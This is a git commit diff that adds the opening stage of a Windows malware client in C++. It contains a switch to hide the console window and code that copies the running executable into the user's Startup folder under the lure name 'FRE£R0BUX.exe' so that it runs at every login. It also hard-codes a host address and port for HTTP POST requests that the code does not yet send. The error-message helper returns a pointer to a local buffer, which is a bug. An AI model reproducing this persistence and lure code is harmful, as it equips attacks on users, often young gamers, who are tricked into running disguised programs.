3c7ef258d04d479b09e39419b280a5c358356e5e
schplorf <112661367+schplorf@users.noreply.github.com>
2022-12-06 21:33:24 +0000

    Very basic persistence and project setup
    Doesnt do anything yet - still shit

--- client.cpp
+++ client.cpp
@@ -1,6 +1,68 @@
+#pragma comment(lib, "ws2_32.lib")
+
+#include <winsock2.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <shlobj.h>
+#include <shobjidl.h>
+#include <string>
 #include <iostream>
 
-int main(){
-    std::cout << "Hello World!" << std::endl;
-    return 0;
+#define susBehaviour true
+#define stealthBehaviour false
+
+#define SERV_PORT 8080 // The port the HTTP POST request will be sent to
+const char szHost[] = "192.168.1.140";
+
+// Function to generate a user-friendly error message based on the error code
+const char* FormatErrorMessage(DWORD errorCode){
+	// Use the FormatMessage function to generate the error message
+	char errorMessage[1024];
+	FormatMessage(
+		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+		NULL,
+		errorCode,
+		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+		errorMessage,
+		sizeof(errorMessage),
+		NULL
+	);
+	// Return the error message
+	return errorMessage;
+}
+
+int main() {
+#if stealthBehaviour
+	ShowWindow(GetConsoleWindow(), SW_HIDE); // Stealth mode activated!
+#endif // stealthBehaviour
+#if susBehaviour
+	// Get the path to the user's startup folder
+	char szStartupPath[MAX_PATH] = { 0 };
+	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+		DWORD errorCode = GetLastError();
+		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
+	}
+	// Get the path to the current executable
+	char szExecPath[MAX_PATH] = { 0 };
+	if (!SUCCEEDED(GetModuleFileName(NULL, szExecPath, MAX_PATH))) {
+		DWORD errorCode = GetLastError();
+		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
+	}
+	// Copy the executable to the startup folder
+	// - First, create a string with the new path of the new file
+	const char szStartupExecName[] = "FRE£R0BUX.exe";
+	char szStartupExecPath[MAX_PATH];
+	sprintf(szStartupExecPath, "%s\\%s", szStartupPath, szStartupExecName);
+
+	if (!SUCCEEDED(CopyFile(szExecPath, szStartupExecPath, NULL))) {
+		DWORD errorCode = GetLastError();
+		printf("Error: %d - %s\n", errorCode, FormatErrorMessage(errorCode));
+	}
+	printf("%s | %s\n", szStartupExecPath, szExecPath);
+	
+#endif // susBehaviour
+	getchar();
+
+	ExitProcess(EXIT_SUCCESS);
 }
